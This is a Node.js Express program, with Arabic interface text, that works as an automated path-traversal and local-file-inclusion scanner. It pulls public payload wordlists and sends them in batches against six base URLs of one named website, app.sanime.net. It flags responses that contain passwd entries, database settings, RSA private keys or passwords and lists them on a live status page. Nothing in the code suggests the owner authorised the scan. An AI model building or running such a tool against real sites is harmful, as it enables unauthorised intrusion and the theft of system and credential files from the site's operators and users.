const axios = require('axios');
const express = require('express');
const http = require('http');
const https = require('https');

const app = express();
const port = process.env.PORT || 10000;

const agent = {
  http: new http.Agent({ keepAlive: true, maxSockets: 100 }),
  https: new https.Agent({ keepAlive: true, maxSockets: 100 })
};

const axiosInstance = axios.create({
  httpAgent: agent.http,
  httpsAgent: agent.https,
  timeout: 5000
});

const payloadSources = [
  'https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/deep_traversal.txt',
  'https://raw.githubusercontent.com/Bo0oM/Path-Traversal-Wordlist/master/path_traversal.txt',
  'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt'
];

const basePaths = [
  "https://app.sanime.net/api/",
  "https://app.sanime.net/api/anime/11751/",
  "https://app.sanime.net/file/",
  "https://app.sanime.net/assets/",
  "https://app.sanime.net/public/",
  "https://app.sanime.net/storage/"
];

const sensitiveIndicators = [
  'root:x', 'DB_HOST', '<?php', '[mysqld]', 'password', 'authorization', 'BEGIN RSA'
];

let foundLeaks = [];
let isScanning = true;
let currentProgress = "يتم تحميل payloads...";

// ✅ Route: واجهة الفحص
app.get('/', (req, res) => {
  res.send(`
  <html><head><meta charset="utf-8"><title>Path Traversal Scanner</title>
  <meta http-equiv="refresh" content="10">
  <style>body{background:#111;color:#0f0;font-family:monospace;padding:20px}a{color:#0ff}</style>
  </head><body>
    <h1>📡 فحص الثغرات</h1>
    ${isScanning ? `<p>🔄 ${currentProgress}</p>` : foundLeaks.length > 0
      ? `<h2>🚨 تم العثور على تسريبات:</h2><ul>${foundLeaks.map(url => `<li><a href="${url}" target="_blank">${url}</a></li>`).join('')}</ul>`
      : `<h2>✅ لا توجد تسريبات</h2>`}
  </body></html>
  `);
});

// ✅ Route: keep-alive
app.get('/ping', (req, res) => {
  res.send('✅ ALIVE');
});

async function fetchPayloads() {
  const all = new Set();
  for (const url of payloadSources) {
    try {
      const res = await axios.get(url);
      res.data.split('\n').forEach(line => {
        if (line.trim()) all.add(line.trim());
      });
    } catch (err) {
      console.log(`⚠️ فشل تحميل ${url}`);
    }
  }
  return Array.from(all);
}

async function scan() {
  const payloads = await fetchPayloads();
  console.log(`📦 Loaded ${payloads.length} payloads`);
  const batchSize = 100;

  for (const base of basePaths) {
    console.log(`🚀 فحص: ${base}`);
    for (let i = 0; i < payloads.length; i += batchSize) {
      const batch = payloads.slice(i, i + batchSize);
      currentProgress = `🔎 فحص ${i + 1} إلى ${i + batch.length} من ${payloads.length} على ${base}`;

      await Promise.allSettled(batch.map(async payload => {
        const url = base + encodeURIComponent(payload);
        try {
          const res = await axiosInstance.get(url);
          const body = res.data.toString();
          if (sensitiveIndicators.some(ind => body.includes(ind))) {
            console.log(`🚨 Leak Detected: ${url}`);
            foundLeaks.push(url);
          }
        } catch (_) {}
      }));

      await new Promise(resolve => setTimeout(resolve, 100)); // small delay
    }
  }

  isScanning = false;
  currentProgress = '✅ فحص مكتمل';
  console.log('✅ انتهى الفحص.');
}

app.listen(port, () => {
  console.log(`🟢 يعمل على المنفذ ${port}`);
  scan();
});
